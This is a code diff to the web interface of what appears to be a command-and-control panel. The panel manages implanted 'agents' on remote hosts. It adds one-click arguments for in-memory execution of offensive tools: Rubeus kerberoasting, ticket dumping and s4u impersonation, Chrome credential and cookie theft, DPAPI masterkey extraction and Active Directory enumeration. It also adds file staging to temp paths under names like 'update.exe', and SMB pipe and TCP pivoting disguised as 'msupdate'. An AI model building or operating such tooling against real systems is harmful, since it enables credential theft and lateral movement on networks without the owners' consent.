@@ -607,122 +607,160 @@ tr.clickable { cursor: pointer; }
         </div>
       </div>
 
-      <!-- .NET Assembly Quick Execute (below terminal) -->
+      <!-- .NET Assembly + Upload + Pivot -->
       <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:14px;margin-top:14px">
-        <div class="card">
-          <div class="card-header"><h3><span>⚡</span> Upload & Execute .NET Assembly</h3></div>
-          <div class="card-body padded">
-            <div style="display:flex;gap:6px;margin-bottom:8px;align-items:end">
-              <div style="flex:1">
-                <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;margin-bottom:3px">.NET Assembly File</label>
-                <input type="file" id="term-asm-file" style="width:100%;padding:6px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px">
-              </div>
-              <div style="flex:1">
-                <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;margin-bottom:3px">Upload To (remote path)</label>
-                <input id="term-asm-path" placeholder="C:\Windows\Temp\" style="width:100%;padding:6px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;font-family:monospace">
-              </div>
-              <div style="flex:1">
-                <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;margin-bottom:3px">Arguments</label>
-                <input id="term-asm-args" placeholder="-group=all" style="width:100%;padding:6px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;font-family:monospace">
-              </div>
-              <button class="btn" onclick="termExecuteAssembly()" style="padding:6px 16px;font-size:12px;white-space:nowrap">⚡ Run</button>
-            </div>
-            <div style="margin-top:6px">
-              <div style="font-size:9px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">Seatbelt</div>
-              <div style="display:flex;flex-wrap:wrap;gap:3px;margin-bottom:6px">
-                <button class="qbtn" onclick="document.getElementById('term-asm-args').value='-group=all'" style="font-size:9px;padding:2px 7px">-group=all</button>
-                <button class="qbtn" onclick="document.getElementById('term-asm-args').value='-group=user'" style="font-size:9px;padding:2px 7px">-group=user</button>
-                <button class="qbtn" onclick="document.getElementById('term-asm-args').value='-group=system'" style="font-size:9px;padding:2px 7px">-group=system</button>
-                <button class="qbtn" onclick="document.getElementById('term-asm-args').value='-group=misc'" style="font-size:9px;padding:2px 7px">-group=misc</button>
-                <button class="qbtn" onclick="document.getElementById('term-asm-args').value='CredEnum'" style="font-size:9px;padding:2px 7px">CredEnum</button>
-                <button class="qbtn" onclick="document.getElementById('term-asm-args').value='DotNet'" style="font-size:9px;padding:2px 7px">DotNet</button>
-              </div>
-              <div style="font-size:9px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">Rubeus</div>
-              <div style="display:flex;flex-wrap:wrap;gap:3px;margin-bottom:6px">
-                <button class="qbtn" onclick="document.getElementById('term-asm-args').value='kerberoast'" style="font-size:9px;padding:2px 7px">kerberoast</button>
-                <button class="qbtn" onclick="document.getElementById('term-asm-args').value='asreproast'" style="font-size:9px;padding:2px 7px">asreproast</button>
-                <button class="qbtn" onclick="document.getElementById('term-asm-args').value='triage'" style="font-size:9px;padding:2px 7px">triage</button>
-                <button class="qbtn" onclick="document.getElementById('term-asm-args').value='klist'" style="font-size:9px;padding:2px 7px">klist</button>
-                <button class="qbtn" onclick="document.getElementById('term-asm-args').value='dump'" style="font-size:9px;padding:2px 7px">dump</button>
-                <button class="qbtn" onclick="document.getElementById('term-asm-args').value='monitor /interval:5'" style="font-size:9px;padding:2px 7px">monitor</button>
-                <button class="qbtn" onclick="document.getElementById('term-asm-args').value='s4u /user:admin /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target /ptt'" style="font-size:9px;padding:2px 7px">s4u</button>
-                <button class="qbtn" onclick="document.getElementById('term-asm-args').value='hash /password:Password123!'" style="font-size:9px;padding:2px 7px">hash</button>
-              </div>
-              <div style="font-size:9px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">SharpHound / Certify / SharpUp</div>
-              <div style="display:flex;flex-wrap:wrap;gap:3px;margin-bottom:6px">
-                <button class="qbtn" onclick="document.getElementById('term-asm-args').value='-c All'" style="font-size:9px;padding:2px 7px">SharpHound -c All</button>
-                <button class="qbtn" onclick="document.getElementById('term-asm-args').value='-c DCOnly'" style="font-size:9px;padding:2px 7px">SharpHound DCOnly</button>
-                <button class="qbtn" onclick="document.getElementById('term-asm-args').value='find /vulnerable'" style="font-size:9px;padding:2px 7px">Certify vulnerable</button>
-                <button class="qbtn" onclick="document.getElementById('term-asm-args').value='cas'" style="font-size:9px;padding:2px 7px">Certify cas</button>
-                <button class="qbtn" onclick="document.getElementById('term-asm-args').value='audit'" style="font-size:9px;padding:2px 7px">SharpUp audit</button>
-                <button class="qbtn" onclick="document.getElementById('term-asm-args').value='all'" style="font-size:9px;padding:2px 7px">SharpUp all</button>
-              </div>
-              <div style="font-size:9px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">SharpDPAPI / SharpChrome / SharpView</div>
-              <div style="display:flex;flex-wrap:wrap;gap:3px">
-                <button class="qbtn" onclick="document.getElementById('term-asm-args').value='triage'" style="font-size:9px;padding:2px 7px">DPAPI triage</button>
-                <button class="qbtn" onclick="document.getElementById('term-asm-args').value='masterkeys'" style="font-size:9px;padding:2px 7px">DPAPI masterkeys</button>
-                <button class="qbtn" onclick="document.getElementById('term-asm-args').value='logins'" style="font-size:9px;padding:2px 7px">Chrome logins</button>
-                <button class="qbtn" onclick="document.getElementById('term-asm-args').value='cookies'" style="font-size:9px;padding:2px 7px">Chrome cookies</button>
-                <button class="qbtn" onclick="document.getElementById('term-asm-args').value='Get-DomainUser'" style="font-size:9px;padding:2px 7px">Get-DomainUser</button>
-                <button class="qbtn" onclick="document.getElementById('term-asm-args').value='Get-DomainComputer'" style="font-size:9px;padding:2px 7px">Get-DomainComputer</button>
-                <button class="qbtn" onclick="document.getElementById('term-asm-args').value='Get-DomainGroup'" style="font-size:9px;padding:2px 7px">Get-DomainGroup</button>
-                <button class="qbtn" onclick="document.getElementById('term-asm-args').value='Find-DomainShare'" style="font-size:9px;padding:2px 7px">Find-DomainShare</button>
-              </div>
-            </div>
+
+        <!-- .NET Assembly -->
+        <div class="card" style="border-top:2px solid rgba(234,179,8,0.5)">
+          <div class="card-header" style="display:flex;align-items:center;justify-content:space-between">
+            <h3 style="margin:0;display:flex;align-items:center;gap:8px"><span>⚡</span> .NET Assembly</h3>
+            <span style="font-size:10px;font-weight:700;padding:2px 8px;border-radius:10px;background:rgba(234,179,8,0.12);color:#ca8a04;border:1px solid rgba(234,179,8,0.3)">IN-MEMORY</span>
           </div>
-        </div>
-        <div class="card">
-          <div class="card-header"><h3><span>📤</span> Upload File to Agent</h3></div>
           <div class="card-body padded">
-            <div style="display:flex;gap:6px;align-items:end">
-              <div style="flex:1">
-                <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;margin-bottom:3px">File</label>
-                <input type="file" id="term-upload-file" style="width:100%;padding:6px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px">
+            <!-- File + path -->
+            <div style="margin-bottom:10px">
+              <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">Assembly File (.exe / .dll)</label>
+              <input type="file" id="term-asm-file" accept=".exe,.dll" style="width:100%;padding:7px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;box-sizing:border-box">
+            </div>
+            <div style="margin-bottom:10px">
+              <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">Stage Path (remote)</label>
+              <input id="term-asm-path" placeholder="C:\Windows\Temp\" style="width:100%;padding:7px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;font-family:monospace;box-sizing:border-box">
+            </div>
+            <!-- Tool tabs -->
+            <div style="margin-bottom:8px">
+              <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:6px">Quick Args</label>
+              <div style="display:flex;gap:4px;margin-bottom:8px;flex-wrap:wrap">
+                <button onclick="asmTab('seatbelt')" id="asmt-seatbelt" style="padding:4px 10px;font-size:11px;border-radius:4px;border:1px solid rgba(234,179,8,0.5);background:rgba(234,179,8,0.15);color:#ca8a04;cursor:pointer;font-weight:600">Seatbelt</button>
+                <button onclick="asmTab('rubeus')" id="asmt-rubeus" style="padding:4px 10px;font-size:11px;border-radius:4px;border:1px solid var(--border);background:var(--bg-input);color:var(--text-muted);cursor:pointer">Rubeus</button>
+                <button onclick="asmTab('sharphound')" id="asmt-sharphound" style="padding:4px 10px;font-size:11px;border-radius:4px;border:1px solid var(--border);background:var(--bg-input);color:var(--text-muted);cursor:pointer">SharpHound</button>
+                <button onclick="asmTab('misc')" id="asmt-misc" style="padding:4px 10px;font-size:11px;border-radius:4px;border:1px solid var(--border);background:var(--bg-input);color:var(--text-muted);cursor:pointer">Other</button>
               </div>
-              <div style="flex:1">
-                <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;margin-bottom:3px">Remote Path (auto if empty)</label>
-                <input id="term-upload-path" placeholder="C:\Users\Public\file.exe" style="width:100%;padding:6px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;font-family:monospace">
+              <div id="asmq-seatbelt" style="display:flex;flex-wrap:wrap;gap:4px">
+                <button class="qbtn" onclick="setAsmArg('-group=all')">-group=all</button>
+                <button class="qbtn" onclick="setAsmArg('-group=user')">-group=user</button>
+                <button class="qbtn" onclick="setAsmArg('-group=system')">-group=system</button>
+                <button class="qbtn" onclick="setAsmArg('-group=misc')">-group=misc</button>
+                <button class="qbtn" onclick="setAsmArg('CredEnum')">CredEnum</button>
+                <button class="qbtn" onclick="setAsmArg('DotNet')">DotNet</button>
               </div>
-              <button class="btn" onclick="termUploadFile()" style="padding:6px 16px;font-size:12px;white-space:nowrap">📤 Upload</button>
+              <div id="asmq-rubeus" style="display:none;flex-wrap:wrap;gap:4px">
+                <button class="qbtn" onclick="setAsmArg('kerberoast')">kerberoast</button>
+                <button class="qbtn" onclick="setAsmArg('asreproast')">asreproast</button>
+                <button class="qbtn" onclick="setAsmArg('triage')">triage</button>
+                <button class="qbtn" onclick="setAsmArg('klist')">klist</button>
+                <button class="qbtn" onclick="setAsmArg('dump')">dump</button>
+                <button class="qbtn" onclick="setAsmArg('monitor /interval:5')">monitor</button>
+                <button class="qbtn" onclick="setAsmArg('hash /password:Password123!')">hash</button>
+                <button class="qbtn" onclick="setAsmArg('s4u /user:USER /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/TARGET /ptt')">s4u /ptt</button>
+              </div>
+              <div id="asmq-sharphound" style="display:none;flex-wrap:wrap;gap:4px">
+                <button class="qbtn" onclick="setAsmArg('-c All')">-c All</button>
+                <button class="qbtn" onclick="setAsmArg('-c DCOnly')">DCOnly</button>
+                <button class="qbtn" onclick="setAsmArg('find /vulnerable')">Certify vuln</button>
+                <button class="qbtn" onclick="setAsmArg('cas')">Certify cas</button>
+                <button class="qbtn" onclick="setAsmArg('audit')">SharpUp audit</button>
+                <button class="qbtn" onclick="setAsmArg('all')">SharpUp all</button>
+              </div>
+              <div id="asmq-misc" style="display:none;flex-wrap:wrap;gap:4px">
+                <button class="qbtn" onclick="setAsmArg('triage')">DPAPI triage</button>
+                <button class="qbtn" onclick="setAsmArg('masterkeys')">DPAPI masterkeys</button>
+                <button class="qbtn" onclick="setAsmArg('logins')">Chrome logins</button>
+                <button class="qbtn" onclick="setAsmArg('cookies')">Chrome cookies</button>
+                <button class="qbtn" onclick="setAsmArg('Get-DomainUser')">Get-DomainUser</button>
+                <button class="qbtn" onclick="setAsmArg('Get-DomainComputer')">Get-DomainComputer</button>
+                <button class="qbtn" onclick="setAsmArg('Find-DomainShare')">Find-DomainShare</button>
+              </div>
+            </div>
+            <!-- Args + run -->
+            <div style="display:flex;gap:6px;margin-top:10px;align-items:center">
+              <input id="term-asm-args" placeholder="Arguments..." style="flex:1;padding:8px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;font-family:monospace">
+              <button onclick="termExecuteAssembly()" style="padding:8px 16px;font-size:12px;font-weight:700;background:linear-gradient(135deg,rgba(234,179,8,0.7),rgba(245,158,11,0.7));border:none;border-radius:var(--radius);color:#fff;cursor:pointer;white-space:nowrap">⚡ Run</button>
             </div>
           </div>
         </div>
 
-        <!-- SMB Pivot Control -->
-        <div class="card">
-          <div class="card-header"><h3><span>🔗</span> Pivot Control</h3><span style="font-size:11px;color:var(--text-muted)">SMB pipe + TCP relay</span></div>
+        <!-- Upload File to Agent -->
+        <div class="card" style="border-top:2px solid rgba(99,102,241,0.5)">
+          <div class="card-header" style="display:flex;align-items:center;justify-content:space-between">
+            <h3 style="margin:0;display:flex;align-items:center;gap:8px"><span>📤</span> Upload to Agent</h3>
+            <span id="upload-status-badge" style="font-size:10px;font-weight:700;padding:2px 8px;border-radius:10px;background:rgba(99,102,241,0.12);color:var(--purple);border:1px solid rgba(99,102,241,0.3)">READY</span>
+          </div>
           <div class="card-body padded">
-            <!-- SMB section -->
-            <p style="font-size:11px;color:var(--text-muted);margin-bottom:6px;font-weight:600;text-transform:uppercase;letter-spacing:1px">SMB Named Pipe (Windows)</p>
-            <p style="font-size:12px;color:var(--text-muted);margin-bottom:8px">Internal agents connect via <span style="color:var(--cyan);font-family:monospace">\\host\pipe\&lt;name&gt;</span></p>
-            <div style="display:flex;gap:6px;margin-bottom:8px;align-items:end">
-              <div style="flex:1">
-                <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;margin-bottom:3px">Pipe Name</label>
-                <input id="pivot-pipe-name" value="msupdate" style="width:100%;padding:6px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;font-family:monospace">
+            <!-- Drop zone -->
+            <div id="upload-dropzone" onclick="document.getElementById('term-upload-file').click()" ondragover="event.preventDefault();this.style.borderColor='var(--purple)'" ondragleave="this.style.borderColor='var(--border)'" ondrop="uploadDropHandler(event)" style="border:2px dashed var(--border);border-radius:8px;padding:20px;text-align:center;cursor:pointer;margin-bottom:12px;transition:border-color .2s">
+              <div style="font-size:24px;margin-bottom:6px">📁</div>
+              <div id="upload-drop-label" style="font-size:12px;color:var(--text-muted)">Drop file here or <span style="color:var(--purple)">click to browse</span></div>
+              <input type="file" id="term-upload-file" onchange="uploadFileSelected()" style="display:none">
+            </div>
+            <!-- Remote path -->
+            <div style="margin-bottom:10px">
+              <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">Remote Destination</label>
+              <input id="term-upload-path" placeholder="C:\Users\Public\update.exe" style="width:100%;padding:8px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;font-family:monospace;box-sizing:border-box">
+            </div>
+            <!-- Quick paths -->
+            <div style="margin-bottom:12px">
+              <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:5px">Quick Paths</label>
+              <div style="display:flex;flex-wrap:wrap;gap:4px">
+                <button class="qbtn" onclick="setUploadPath('C:\\Windows\\Temp\\')">%TEMP%</button>
+                <button class="qbtn" onclick="setUploadPath('C:\\Users\\Public\\')">Public</button>
+                <button class="qbtn" onclick="setUploadPath('C:\\ProgramData\\')">ProgramData</button>
+                <button class="qbtn" onclick="setUploadPath('/tmp/')">/tmp</button>
+                <button class="qbtn" onclick="setUploadPath('/dev/shm/')">/dev/shm</button>
               </div>
             </div>
-            <div style="display:flex;gap:6px;margin-bottom:14px">
-              <button class="btn" onclick="sendPivotCmd('start')" style="flex:1;padding:7px;font-size:12px">▶ Start</button>
-              <button class="qbtn danger" onclick="sendPivotCmd('stop')" style="flex:1;padding:7px;font-size:12px">■ Stop</button>
-              <button class="qbtn" onclick="sendPivotCmd('list')" style="flex:1;padding:7px;font-size:12px">≡ List</button>
+            <button onclick="termUploadFile()" style="width:100%;padding:10px;font-size:13px;font-weight:700;background:linear-gradient(135deg,rgba(99,102,241,0.8),rgba(139,92,246,0.8));border:none;border-radius:var(--radius);color:#fff;cursor:pointer">
+              📤 &nbsp;Upload File
+            </button>
+            <div id="upload-result" style="margin-top:10px;font-size:12px;font-family:monospace"></div>
+          </div>
+        </div>
+
+        <!-- Pivot Control -->
+        <div class="card" style="border-top:2px solid rgba(34,197,94,0.5)">
+          <div class="card-header" style="display:flex;align-items:center;justify-content:space-between">
+            <h3 style="margin:0;display:flex;align-items:center;gap:8px"><span>🔗</span> Pivot Control</h3>
+            <span id="pivot-status-badge" style="font-size:10px;font-weight:700;padding:2px 8px;border-radius:10px;background:rgba(100,100,100,0.12);color:var(--text-muted);border:1px solid var(--border)">IDLE</span>
+          </div>
+          <div class="card-body padded">
+            <!-- Mode tabs -->
+            <div style="display:flex;gap:0;margin-bottom:14px;border:1px solid var(--border);border-radius:6px;overflow:hidden">
+              <button id="pivot-tab-smb" onclick="pivotTab('smb')" style="flex:1;padding:8px;font-size:12px;font-weight:600;border:none;cursor:pointer;background:rgba(34,197,94,0.15);color:#16a34a;border-right:1px solid var(--border)">🪟 SMB Pipe</button>
+              <button id="pivot-tab-tcp" onclick="pivotTab('tcp')" style="flex:1;padding:8px;font-size:12px;font-weight:600;border:none;cursor:pointer;background:var(--bg-input);color:var(--text-muted)">🌐 TCP Relay</button>
             </div>
-            <!-- TCP section -->
-            <div style="border-top:1px solid var(--border);padding-top:12px;margin-bottom:8px">
-              <p style="font-size:11px;color:var(--text-muted);margin-bottom:6px;font-weight:600;text-transform:uppercase;letter-spacing:1px">TCP Relay (Cross-Platform)</p>
-              <p style="font-size:12px;color:var(--text-muted);margin-bottom:8px">Bind a TCP port — works on Linux and Windows without named pipe access.</p>
-              <div style="display:flex;gap:6px;margin-bottom:8px;align-items:end">
-                <div style="flex:1">
-                  <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;margin-bottom:3px">Bind Addr (port or host:port)</label>
-                  <input id="pivot-tcp-addr" value="4444" style="width:100%;padding:6px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;font-family:monospace">
-                </div>
+
+            <!-- SMB panel -->
+            <div id="pivot-panel-smb">
+              <div style="padding:8px 10px;background:rgba(34,197,94,0.06);border:1px solid rgba(34,197,94,0.2);border-radius:6px;font-size:11px;color:var(--text-muted);margin-bottom:12px">
+                Internal agents connect via <span style="color:var(--cyan);font-family:monospace">\\host\pipe\&lt;name&gt;</span> — Windows only
               </div>
-              <div style="display:flex;gap:6px;margin-bottom:10px">
-                <button class="btn" onclick="sendTCPPivotCmd('tcp-start')" style="flex:1;padding:7px;font-size:12px">▶ Start TCP</button>
-                <button class="qbtn danger" onclick="sendTCPPivotCmd('tcp-stop')" style="flex:1;padding:7px;font-size:12px">■ Stop</button>
-                <button class="qbtn" onclick="sendTCPPivotCmd('tcp-list')" style="flex:1;padding:7px;font-size:12px">≡ List</button>
+              <div style="margin-bottom:10px">
+                <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">Pipe Name</label>
+                <input id="pivot-pipe-name" value="msupdate" style="width:100%;padding:8px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;font-family:monospace;box-sizing:border-box">
+              </div>
+              <div style="display:flex;gap:6px">
+                <button onclick="sendPivotCmd('start')" style="flex:1;padding:8px;font-size:12px;font-weight:600;background:rgba(34,197,94,0.15);border:1px solid rgba(34,197,94,0.4);border-radius:var(--radius);color:#16a34a;cursor:pointer">▶ Start</button>
+                <button onclick="sendPivotCmd('stop')" style="flex:1;padding:8px;font-size:12px;font-weight:600;background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.3);border-radius:var(--radius);color:#ef4444;cursor:pointer">■ Stop</button>
+                <button onclick="sendPivotCmd('list')" class="qbtn" style="flex:1;padding:8px;font-size:12px">≡ List</button>
               </div>
             </div>
-            <div id="pivot-result" style="font-size:12px;font-family:monospace;color:var(--green);white-space:pre-wrap;min-height:32px"></div>
+
+            <!-- TCP panel -->
+            <div id="pivot-panel-tcp" style="display:none">
+              <div style="padding:8px 10px;background:rgba(99,102,241,0.06);border:1px solid rgba(99,102,241,0.2);border-radius:6px;font-size:11px;color:var(--text-muted);margin-bottom:12px">
+                Binds a TCP port on the agent — works on Linux and Windows
+              </div>
+              <div style="margin-bottom:10px">
+                <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">Bind Address (port or host:port)</label>
+                <input id="pivot-tcp-addr" value="4444" style="width:100%;padding:8px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;font-family:monospace;box-sizing:border-box">
+              </div>
+              <div style="display:flex;gap:6px">
+                <button onclick="sendTCPPivotCmd('tcp-start')" style="flex:1;padding:8px;font-size:12px;font-weight:600;background:rgba(34,197,94,0.15);border:1px solid rgba(34,197,94,0.4);border-radius:var(--radius);color:#16a34a;cursor:pointer">▶ Start</button>
+                <button onclick="sendTCPPivotCmd('tcp-stop')" style="flex:1;padding:8px;font-size:12px;font-weight:600;background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.3);border-radius:var(--radius);color:#ef4444;cursor:pointer">■ Stop</button>
+                <button onclick="sendTCPPivotCmd('tcp-list')" class="qbtn" style="flex:1;padding:8px;font-size:12px">≡ List</button>
+              </div>
+            </div>
+
+            <div id="pivot-result" style="margin-top:12px;font-size:12px;font-family:monospace;color:var(--green);white-space:pre-wrap;min-height:24px;padding:6px 0"></div>
           </div>
         </div>
 
@@ -3478,6 +3516,60 @@ function termUploadFileSelected(input) {
   if (input.files && input.files[0]) {
     dz.innerHTML = '<span style="color:#10b981">📄 ' + input.files[0].name + ' (' + Math.round(input.files[0].size/1024) + 'KB)</span>';
   }
+}
+
+// .NET Assembly tab switcher
+function asmTab(tab) {
+  ['seatbelt','rubeus','sharphound','misc'].forEach(t => {
+    const btn = document.getElementById('asmt-'+t);
+    const panel = document.getElementById('asmq-'+t);
+    const active = t === tab;
+    if (btn) {
+      btn.style.background = active ? 'rgba(234,179,8,0.15)' : 'var(--bg-input)';
+      btn.style.borderColor = active ? 'rgba(234,179,8,0.5)' : 'var(--border)';
+      btn.style.color = active ? '#ca8a04' : 'var(--text-muted)';
+      btn.style.fontWeight = active ? '600' : '400';
+    }
+    if (panel) panel.style.display = active ? 'flex' : 'none';
+  });
+}
+
+function setAsmArg(val) { document.getElementById('term-asm-args').value = val; }
+function setUploadPath(val) { document.getElementById('term-upload-path').value = val; }
+
+// Upload drag & drop
+function uploadDropHandler(e) {
+  e.preventDefault();
+  const dt = e.dataTransfer;
+  if (dt.files && dt.files[0]) {
+    document.getElementById('term-upload-file').files = dt.files;
+    uploadFileSelected();
+  }
+  e.currentTarget.style.borderColor = 'var(--border)';
+}
+
+function uploadFileSelected() {
+  const f = document.getElementById('term-upload-file').files[0];
+  if (!f) return;
+  const label = document.getElementById('upload-drop-label');
+  const badge = document.getElementById('upload-status-badge');
+  if (label) label.innerHTML = '<span style="color:var(--green)">📄 ' + f.name + ' <span style="color:var(--text-muted)">(' + (f.size > 1048576 ? (f.size/1048576).toFixed(1)+'MB' : Math.round(f.size/1024)+'KB') + ')</span></span>';
+  if (badge) { badge.textContent = 'FILE READY'; badge.style.background='rgba(34,197,94,0.12)'; badge.style.color='#16a34a'; badge.style.borderColor='rgba(34,197,94,0.3)'; }
+}
+
+// Pivot tab switcher
+function pivotTab(tab) {
+  ['smb','tcp'].forEach(t => {
+    const btn = document.getElementById('pivot-tab-'+t);
+    const panel = document.getElementById('pivot-panel-'+t);
+    const active = t === tab;
+    if (btn) {
+      btn.style.background = active ? 'rgba(34,197,94,0.15)' : 'var(--bg-input)';
+      btn.style.color = active ? '#16a34a' : 'var(--text-muted)';
+      btn.style.fontWeight = active ? '600' : '400';
+    }
+    if (panel) panel.style.display = active ? 'block' : 'none';
+  });
 }
 
 async function termExecuteAssembly() {
